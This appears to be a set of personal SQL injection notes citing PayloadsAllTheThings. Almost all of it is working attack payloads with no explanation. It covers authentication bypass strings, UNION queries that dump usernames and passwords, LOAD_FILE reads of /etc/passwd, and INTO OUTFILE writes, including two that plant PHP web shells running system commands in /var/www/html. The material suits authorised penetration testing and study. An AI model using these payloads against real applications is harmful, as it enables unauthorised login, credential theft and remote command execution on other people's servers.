
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

Using OR for authentication bypass
```SQL
admin' or '1'='1
```

Using comments for authentication bypass
```SQL
admin'--
```

Union statements
```SQL
SELECT * FROM ports UNION SELECT * FROM ships;
```
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

Get secure file priv status with union
```sql
UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

Reading File Contents
```sql
SELECT LOAD_FILE('/etc/passwd');
```

Writing to File
```SQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
writing to file with union
```sql
union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

Creating webshell
```SQL
union select "",'<?php system($_GET[\'cmd\']);?>', "", "" into outfile '/var/www/html/shell2.php'-- -
```
```sql
union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```




